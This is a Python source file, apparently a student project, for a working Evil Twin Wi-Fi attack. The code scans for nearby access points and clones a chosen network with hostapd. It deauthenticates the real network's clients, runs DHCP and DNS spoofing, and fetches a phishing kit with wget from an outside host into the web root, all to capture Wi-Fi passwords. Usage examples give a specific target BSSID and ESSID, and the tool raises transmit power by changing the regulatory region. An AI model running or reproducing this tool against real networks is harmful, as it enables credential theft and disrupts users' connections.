#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#UNAM-CERT
#Integrantes:
#Pedro Rdriguez
#Leal Gonzalez Ignacio

import argparse
import optparse
import subprocess
import ConfigParser
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys, os, signal
import threading
#import netifaces
import pip
import shutil

def addOptions():
    '''
    Funcion que parsea los datos que se tomen de linea de comandos como opciones para ejecutar el programa
    Devuelve un objeto cuyos atributos son las opciones de ejecucion
    '''
    parser = argparse.ArgumentParser(description='Evil Twin')
    parser.add_argument('-u'    , '--use_mode'  , dest='mode'      , required=True  , default=None      , help='Modo de uso del programa: interactivo, args, file')
    parser.add_argument('-i'    , '--interface' , dest='interface' , type=str       , required=False    , default=None   , help='Interface to use for sniffing and packet injection')
    parser.add_argument('-b'    , '--bssid'     , dest='bssid'     , type=str       , required=False    , default=None   , help='Direccion MAC del AP')
    parser.add_argument('-e'    , '--essid'     , dest='essid'     , type=str       , required=False    , default=None   , help='Nombre de la red inalambrica')
    parser.add_argument('-c'    , '--channel'   , dest='channel'   , type=int       , required=False    , choices=range(1,16) , default=int(5) , help='Canal del AP ')
    parser.add_argument('-p'    , '--txpower'   , dest='txpower'   , type=int       , required=False    , choices=range(20,31,10), default=20 , help='Potencia de la antena')
    parser.add_argument('-f'    , '--first_ip'  , dest='first_ip'  , type=str       , required=False    , default=None   , help='Primer IP del pool DHCP')
    parser.add_argument('-l'    , '--last_ip'   , dest='last_ip'   , type=str       , required=False    , default=None   , help='Ultima IP del pool DHCP')
    parser.add_argument('-m'    , '--mask'      , dest='mask'      , type=str       , required=False    , default=None   , help='Mascara')
    parser.add_argument('-g'    , '--gateway'   , dest='gateway'   , type=str       , required=False    , default=None   , help='Gateway')
    parser.add_argument('-C'    , '--cdb'       , dest='cdb'       , required=False , default=None      , help='Creacion de una base de datos')
    parser.add_argument('-D'    , '--ddb'       , dest='ddb'       , required=False , default=None      , help='Eliminacion de una base de datos')
    parser.add_argument('-F'    , '--file'      , dest='config'    , required=False , default=None      , help='Indica el archivo el cual contiene las opciones para ejecutar el programa')
    #parser.add_argument('-B'    , '--base'      , dest='base'      , type=str       , required=False    , default=None   , help='Nombre de la base de datos')
    #parser.add_argument('-U'    , '--usuario'   , dest='usuario'   , type=str       , required=False    , default=None   , help='Nombre del usuario que se creara para acceder a la base de datos de MySQL')
    #parser.add_argument('-P'    , '--password'  , dest='password'  , type=str       , required=False    , default=None   , help='Password del usuario creado para acceder a la base de datos')
    #parser.add_argument('-t'    , '--table'     , dest='table'     , type=str       , required=False    , default=None   , help='Nombre de la tabla de la base de datos')
    args = parser.parse_args()
    return args

def addOptionsFile(configfile):
    '''
    Funcion que parsea los datos que se tomen de un archivo como opciones para ejecutar el programa, recibe el nombre 
    del archivo del que se obtendrán las opciones de ejecucion y devuelve una tupla cuyos atributos son las opciones de ejecucion
    '''
    config = ConfigParser.ConfigParser()
    config.read(configfile)
    parser = optparse.OptionParser()
    parser.add_option('-u'      , '--use_mode'  , dest='mode'       , default=config.get("Options", "use_mode")     , help='Modo de uso del programa: Interactivo, Argumentos, Archivo')
    parser.add_option('-i'      , '--interface' , dest='interface'  , type=str       , default=config.get("Options", "interface")    , help='Interface to use for sniffing and packet injection')
    parser.add_option('-b'      , '--bssid'     , dest='bssid'      , type=str       , default=config.get("Options", "bssid")        , help='Direccion MAC del AP')
    parser.add_option('-e'      , '--essid'     , dest='essid'      , type=str       , default=config.get("Options", "essid")        , help='Nombre de la red inalambrica')
    parser.add_option('-c'      , '--channel'   , dest='channel'    , type=int       , default=int(config.get("Options", "channel")) , help='Canal del AP')
    parser.add_option('-p'      , '--txpower'   , dest='txpower'    , type=int       , default=int(config.get("Options", "txpower")) , help='Potencia de la antena')
    parser.add_option('-f'      , '--first_ip'  , dest='first_ip'   , type=str       , default=config.get("Options", "first_ip")     , help='Primer IP del pool DHCP')
    parser.add_option('-l'      , '--last_ip'   , dest='last_ip'    , type=str       , default=config.get("Options","last_ip")       , help='Ultima IP del pool DHCP')
    parser.add_option('-m'      , '--mask'      , dest='mask'       , type=str       , default=config.get("Options", "mask")         , help='Mascara')
    parser.add_option('-g'      , '--gateway'   , dest='gateway'    , type=str       , default=config.get("Options","gateway")       , help='Gateway')
    parser.add_option('-C'      , '--cdb'       , dest='cdb'        , default=config.get("Options", "cdb")          , help='Creacion de una base de datos')
    parser.add_option('-D'      , '--ddb'       , dest='ddb'        , default=config.get("Options", "ddb")          , help='Eliminacion de una base de datos')
    parser.add_option('-F'      , '--file'      , dest='config'     , default=None                                  , help='Archivo del cual se tomara la configuracon a implemetar')
    #parser.add_option('-B'      , '--base'      , dest='base'       , type=str       , default=config.get("Options","base")          , help='Nombre de la base de datos')
    #parser.add_option('-U'      , '--usuario'   , dest='usuario'    , type=str       , default=config.get("Options","usuario")       , help='Nombre del usuario que se creara para acceder a la base de datos de MySQL')
    #parser.add_option('-P'      , '--password'  , dest='password'   , type=str       , default=config.get("Options","password")      , help='Password del usuario creado para acceder a la base de datos')
    #parser.add_option('-t'      , '--table'     , dest='table'      , type=str       , default=config.get("Options","table")       , help='Nombre de la tabla de la base de datos')
    args = parser.parse_args()
    return args

channel_list = []
essid_list = []
bssid_list = []
enc_list = []
networks = {} # dictionary to store APs
interface_list = [] # Lista para interfaces
# Beacons and ProbeResponses.

def restartMysql():
    '''
    Funcion para reiniciar MySQL
    '''
    os.system("service mysql start >/dev/null") 

def restartApache():
    '''
    Funcion para reiniciar Apache
    '''
    os.system("service apache2 start >/dev/null")

def validaciones():
    '''
    Funcion que revisa que esten instalados todas las dependencias necesarias, en caso de faltar una la instala.
    '''
    packagePip()
    verifyPackage()
    restartApache()
    restartMysql()

def packagePip():
    '''
    Funcion con todas las librerias necesarias de python para la ejecucion del programa.
    '''
    lista = ['netifaces']
    for indice in lista:
        packagePipVerify(indice)

def packagePipVerify(package):
    '''
    Funcion que comprueba si esta instalada una libreria en python y la importa en caso contrario la instala y la importa.
    '''
    import importlib
    try:
        importlib.import_module(package)   
    except ImportError:       
        print "Instalando " + package
	pip.main(['install', 'netifaces'])
    finally:
        globals()[package] = importlib.import_module(package)

def verifyPackage():
    '''
    Verifica si tenemos instalados los paquetes necesarios para ejecutar el programa, en caso contrario lo instala
    '''
    list_cmd = ['airmon-ng', 'dnsmasq', 'hostapd', 'dnsspoof', 'aireplay-ng', 'apache2']
    for cmd in list_cmd:
        exist = subprocess.call('command -v '+ cmd + '>> /dev/null', shell=True)
        if exist == 0:
		pass
        else:
            print "Isntalando " + cmd + "..."
            proc = subprocess.Popen('apt install -y ' + cmd, shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
            proc.wait()

def sniffAP(p):
    '''
    Funcion que realiza el escaneo de los Access Point que se encuentran cerca.
    '''
    if ( (p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp))
                 and not networks.has_key(p[Dot11].addr3)):
        essid      = p[Dot11Elt].info if '\x00' not in p[Dot11Elt].info and p[Dot11Elt].info != '' else 'ESSID Oculto'
        bssid      = p[Dot11].addr3
        channel    = int( ord(p[Dot11Elt:3].info))
        pa = p[Dot11Elt]
        cap = p.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
        crypto = set()
        while isinstance(pa, Dot11Elt):
            if pa.ID == 48:
                crypto.add("WPA2")
            elif pa.ID == 221 and pa.info.startswith('\x00P\xf2\x01\x01\x00'):
                crypto.add("WPA")
            pa = pa.payload
        if not crypto:
            if 'privacy' in cap:
                crypto.add("WEP")
            else:
                crypto.add("OPN")
        enc = '/'.join(crypto)
        if bssid not in networks:
            networks[bssid] = ( essid, channel, enc )
            channel_list.append(channel)
            essid_list.append(essid)
            bssid_list.append(bssid)
            enc_list.append(enc)
            # Imprime cada que encuentra una nueva red
            print "{0:3}\t{1:10}\t{2:20}\t{3:20}".format(int(channel), enc, bssid, essid)

def sniff_process(interface):
    '''
    Funcion que imprime la cabecera del escaneo e inicia un sniffer.
    '''
    # Imprimir cabecera del escaneo
    print "\nEl escaneo terminara el 15 segundos u oprime CTRL + C"
    print "{0:3}\t{1:10}\t{2:20}\t{3:20}".format('CH','ENC','BSSID','SSID')
    # Ininicamos el Sniffer
    sniff(iface=interface,prn=sniffAP,timeout=15)

def clean_screen():
    '''
    Funcion para limpiar la pantalla.
    '''
    os.system('clear')

def chose_iface(interface):
    '''
    Funcion que seleccione la interfaz de red a utilizar ya sea que se lo pasemos por parametro o sea de modo interactivo
    '''
    #Modo interactivo
    if interface == None:
        # Listar interfaces disponibles
        interface_list = netifaces.interfaces()
        print "======= Interfaces disponibles =======\n"
        for i, interface in enumerate(interface_list):
            print "\t%02d: %s" %(i, str(interface))
        target_interface = raw_input('\nIntroduce la interface a utilizar en modo monitor ')
        while target_interface not in interface_list:
            target_interface = raw_input('Interface no se encuentra... Por favor introduce otro: ')
        # Cambiamos interfaz a modo: Monitor
        print 'Cambiando interface ' + target_interface + ' a modo monitor '
        return target_interface
    #Interfaz pasada como parametro
    else:
        # Listar interfaces disponibles
        interface_list = netifaces.interfaces()
        while interface not in interface_list:
            interface = raw_input('Interface no se encuentra... Por favor introduce otro: ')
        # Cambiamos interfaz a modo: Monitor
        print 'Cambiando interface ' + interface + ' a modo monitor '
        return interface

def monitor_iface(target_interface):
    '''
    Funcion que establece la interfaz de red seleccionada en modo monitor
    '''
    interface_list = netifaces.interfaces()
    while target_interface not in interface_list:
        print "La interface %s no existe" % (target_interface)
        sys.exit()
    os.system("airmon-ng start %s 1>/dev/null" % (target_interface))
    interface = str(target_interface)
    return interface

def iface_txpower(interface,mode,txpower):
    '''
    Funcion que establece la potencia que va a utilizar la antena
    '''
    # Cambiar potencia de antena
    if mode == "interactivo":
        target_txpower = raw_input('\n¿Deseas incrementar la potencia de tu antena a 30dB? (s/n)')
        if target_txpower == 's':
            os.system("ifconfig %s down" % (interface))
            os.system("iw reg set GY") #GY o BO
            os.system("ifconfig %s up" % (interface))
            os.system("iwconfig %s txpower 30" % (interface))
        elif target_txpower == 'n':
            pass
    elif txpower == None:
        pass 
    else:
        #print "iface_txpower args"
        os.system("ifconfig %s down" % (interface))
        os.system("iw reg set GY") #GY o BO
        os.system("ifconfig %s up" % (interface))
        os.system("iwconfig %s txpower %s" % (interface,str(txpower)))

def run_dnsmasq(interface,first_ip,last_ip,mask,gateway):
    '''
    Funcion que realiza la configuracion del dnsmasq y la guarda en un archivo, creacion del pool de direccioes para 
    asignar mediante DHCP y ejecucion de dnsmasq
    '''
    # Colocamos la informacion que ira en el archivo de configuracion dnsmasq.conf
    dnsmasq_text = ['interface='+interface,
                    'dhcp-range='+first_ip+','+last_ip+','+mask+','+'12m',
                    'dhcp-option=3,'+gateway,
                    'dhcp-option=6,'+gateway,
                    'server=8.8.8.8',
                    'server=8.8.4.4',
                    'log-queries',
                    'log-dhcp',
                    'listen-address=127.0.0.1',
                    'dhcp-authoritative'
                    ]
    # Crear archivo dnsmasq.conf
    outF = open("dnsmasq.conf", "w")
    for line in dnsmasq_text:
      # Escribimos cada linea en nuestro archivo de configuracion
      outF.write(line)
      outF.write("\n")
    outF.close()

    # Creamos DHCP con dnsmasq
    gateway_dhcp = ['ifconfig '+interface+' '+gateway+' netmask '+mask,
                    'iptables --flush',
                    'iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE',
                    'iptables --append FORWARD --in-interface '+interface+' -j ACCEPT',
                    'echo 1 > /proc/sys/net/ipv4/ip_forward'
                    ]
    # Creamos el archivo con la configuracion de la intefaz wlan0mon y el dhcp
    outF = open("conf_gateway_dhcp.txt", "w")
    for line in gateway_dhcp:
      # Escribimos cada linea en nuestro archivo de configuracion
      outF.write(line)
      outF.write("\n")
    outF.close()
    # Leemos el archivo y ejecutamos cada instruccion
    outF = open("conf_gateway_dhcp.txt", "r")
    lines = outF.readlines()
    for line in lines:
      # Ejecutamos cada linea en el archivo.
      os.system(line)
    outF.close()
    # Subproceso
    p = subprocess.Popen(["xterm", "-e", "dnsmasq", "-C", "./dnsmasq.conf", "-d"])

def conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway):
    '''
    Funcion que realiza la configuracion del pool de direcciones para DHCP, direccion IP de inicio, direccion IP final, 
    gateway y mascara, ya sea de modo interactivo o por medio de paso de parametros.
    '''
    dnsmasq_text = []
    if mode == "interactivo":
        net_opts = {'1': ('192.168.1.10', '192.168.1.254', '255.255.255.0', '192.168.1.1'), '2': ('10.0.0.10', '10.0.0.254', '255.255.255.0', '10.0.0.1')}
        print "======= Configuracion de Red Disponible =======\n\t1. 192.168.1.0/24\n\t2. 10.0.0.0/24"
        target_network = raw_input('Elige una opcion: ')
        while target_network not in net_opts:
            target_network = raw_input('El numero de red que escogiste es incorrecto, intenta de nuevo: ')
        # Configuramos cada parametro con la opcion elegida
        first_ip = net_opts[target_network][0]
        last_ip  = net_opts[target_network][1]
        mask     = net_opts[target_network][2]
        gateway  = net_opts[target_network][3]
        print gateway
        run_dnsmasq(interface,first_ip,last_ip,mask,gateway)
    else:
        run_dnsmasq(interface,first_ip,last_ip,mask,gateway)
        pass

def run_rogueAP(interface,channel,essid):
    '''
    Funcion que crea un access point falso con los parametros seleccionados por el usuario, por medio del comando 
    hostapd
    '''
    hostapd_text = ['interface='+interface,
                  'driver=nl80211',
                  'ssid='+essid,
                  'hw_mode=g',
                  'channel='+str(channel),
                  'macaddr_acl=0',
                  'ignore_broadcast_ssid=0'
                 ]
    # Crear archivo hostapd.conf
    outF = open("hostapd.conf", "w")
    for line in hostapd_text:
      # write line to output file
      outF.write(line)
      outF.write("\n")
    outF.close()
    # Subproceso
    p = subprocess.Popen(["xterm", "-e", "hostapd", "./hostapd.conf"])

def rogueAP(interface,channel,essid,mode):
    '''
    Funcion que prepara los parametros para la ejecucion de un Access Point falso.
    '''
    channels = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15']
    if mode == "interactivo":
        target_channel = raw_input('Selecciona el canal en el que trabajara RougeAP [1-15]: ')
        while target_channel not in channels:
            target_channel = raw_input('Canal incorrecto, intenta de nuevo: ')
        run_rogueAP(interface,target_channel,essid)
    else:
        print "run_rogueAP in args or file mode"
        run_rogueAP(interface,channel,essid)

def dnssnoof(interface):
    '''
    Creacion de un DNS spoofing
    '''
    p = subprocess.Popen(["xterm", "-e", "dnsspoof", "-i", interface])

def desAuthentication(interface,bssid):
    '''
    Funcion para des autenticar usuarios de un Access Point seleccionado
    '''
    p = subprocess.Popen(["xterm", "-e", "aireplay-ng", "-00", "-a", bssid, interface])

def create_db(usuario, password, base, table):
    '''
    Funcion para la creacion de una base de datos para almacenar las credenciales obtenidas.
    '''
    os.system("./mysql-db-create.sh " + base + " " + usuario + " " + password + " " + table)

def delete_db(base, usuario):
    '''
    Funcion para la eliminacion de una base de datos.
    '''
    os.system("./mysql-db-delete.sh " + base + " " + usuario)

def use_modeI(mode):
    '''
    Funcion para el modo de ejecucion donde el usuario va interactuando con el programa.
    '''
    interface = None
    bssid     = None
    essid     = None
    channel   = None
    txpower   = None
    first_ip  = None
    last_ip   = None
    mask      = None
    gateway   = None
    target_interface = chose_iface(interface)
    #Cambiamos a modo: Monitor
    interface = monitor_iface(target_interface)
    # Cambair la potencia de la antena.
    iface_txpower(interface,mode,txpower)
    # Proceso de sniffer para redes WIFI
    sniff_process(interface)
    # Limpiamos la terninal antes de mostrar los resultados
    clean_screen()
    # Mostramos redes disponibles
    print "======= Redes Inalambricas Disponibles =======\n"
    print "{0:3}\t{1:5}\t{2:28}\t{3:20}\t{4:5}".format('ID', 'Canal', 'ESSID', 'BSSID', 'ENC')
    for i in range(len(essid_list)):
        print "{0:3}\t{1:5}\t{2:28}\t{3:20}\t{4:5}".format(i, channel_list[i], essid_list[i], bssid_list[i], enc_list[i])
    target_bssid = raw_input('Introduce el BSSID de la red Wifi a clonar: ')
    while target_bssid not in networks:
        raw_input('BSSID no se encuentra... Por favor introduce otro: ')
    bssid = target_bssid
    essid = networks[bssid][0]
    # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
    rogueAP(interface,channel,essid,mode)
    # Llamamos a la funcion desAuthentication()
    desAuthentication(interface,bssid)
    # Llamamos a la funcion conf_dnsmasq() para crear DHCP que usara RogueAP
    conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway)
    # Llamamos la funcion dnssnoof() para redirigir a nuetra Fake page
    dnssnoof(interface)
    creacionSitio()

def use_modeAF(mode, interface, bssid, essid, channel, txpower, first_ip, last_ip, mask, gateway):
    '''
    Funcion para el modo de ejecucion args o file.
    '''
    target_interface = chose_iface(interface)
    #Cambiamos a modo: Monitor
    interface = monitor_iface(target_interface)
    # Cambair la potencia de la antena.
    iface_txpower(interface,mode,txpower)
    # Limpiamos la terninal antes de mostrar los resultados
    clean_screen()
    # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
    rogueAP(interface,channel,essid,mode)
    # Llamamos a la funcion desAuthentication()
    desAuthentication(interface,bssid)
    # Llamamos a la funcion conf_dnsmasq() para crear DHCP que usara RogueAP
    conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway)
    # Llamamos la funcion dnssnoof() para redirigir a nuetra Fake page
    dnssnoof(interface)
    creacionSitio()

def use():
    '''
    Funcion que nos muestra ejemplos de como ejecutar el programa.
    '''
    print "Use: %s [opciones]" % __file__
    print ""
    print "   -cdb,   --cdb         Creara la base de datos"
    print ""
    print "Ejemplo:    %s -cdb" % __file__
    print ""
    print "   -cdb,   --ddb         Borra la base de datos"
    print ""
    print "Ejemplo:    %s -ddb" % __file__
    print ""
    print "   -mode,   --mode         Modos de uso [interactivo, arg y file]"
    print ""
    print "---- interactivo ----\n"
    print "Ejemplo:    %s -mode interactivo" % __file__
    print ""
    print "---- file ----\n"
    print "Ejemplo:    %s -mode -file <Nombre del archivo>" % __file__
    print ""
    print "---- args ----\n"
    print "   -i,     --interface    Interface de red inalambrica a utilizar."
    print "   -bssid, --bssid        Direccion MAC de AP a clonar"
    print "   -essid, --essid        Nombre del AP a clonar"
    print "   -c,     --channel      Canal que ocupara la antena inalambrica"
    print "   -p,     --txpower      Potencia de la antena [unicamente 30 :(]"
    print "   -f_ip,  --first_ip     Primer IP del pool DHCP"
    print "   -l_ip,  --last_ip      Ultima IP del pool DHCP"
    print "   -m,     --mask         Mascara de red"
    print "   -g,     --gateway      Gateway a utilizar"
    print ""
    print "Ejemplo:  %s -mode args -i <interface> -bssid <FF:FF:FF:FF:FF:FF> -essid <RougeAP> ..." % __file__

def creacionSitio():
    '''
    Creacion de un sitio web falso, para obtener las credenciales del access point
    '''
    os.system("rm -rf /var/www/html/*")
    os.system("wget https://www.shellvoide.com/media/files/rogueap.zip")
    os.system("unzip rogueap.zip -d /var/www/html/")
    restartApache()

if __name__ == "__main__":
    '''
    Funcion principal parecida al main del lenguaje de programacion C.
    '''
    validaciones()
    opts = addOptions()
    if opts.cdb != None and len(sys.argv) == 2:
        print "Creando base de datos..."
        #c_database()
    elif opts.ddb != None and len(sys.argv) == 2:
        print "Borrando base de datos"
        #d_database()
    #Modo de ejecucion interactivo
    elif opts.mode == "interactivo":
        print "Mode: Interactivo"
        use_modeI(opts.mode)
    #Modo de ejecucion args
    elif opts.mode == 'args':
        print "Mode: args"
        use_modeAF(opts.mode, opts.interface, opts.bssid, opts.essid, opts.channel, opts.txpower, opts.first_ip, opts.last_ip, opts.mask, opts.gateway)
    #Modo de ejecucion file
    elif opts.mode == 'file':
        print "Mode: file"
        opts = addOptionsFile(opts.config)        
        use_modeAF(opts[0].mode, opts[0].interface, opts[0].bssid, opts[0].essid, opts[0].channel, opts[0].txpower, opts[0].first_ip, opts[0].last_ip, opts[0].mask, opts[0].gateway)
    #Ejemplo de como ejecutar el programa
    else:
        use()

'''
Mode interactivo: python evil.py -u interactivo
Mode args: python evil.py -u args -i wlan0 -b 18:4A:6F:6C:E2:88 -e INFINITUMFDCA -c 8 -f 192.170.0.100 -l 192.170.0.150 -m 255.255.255.0 -g 192.170.0.1 -p 0
Mode file: python evil.py -u file -F archivo.conf -i wlan0

Nota: Si utilizas una a ntena Tp-link wn722N v3, sigue los siguientes pasos:
#apt update && apt upgrade
#apt install -y bc linux-headers-amd64
#git clone https://github.com/kimocoder/rtl8188eus.git
#cd rtl8188eus 
#cp realtek_blacklist.conf /etc/modprobe.d
#make 
#make install
'''
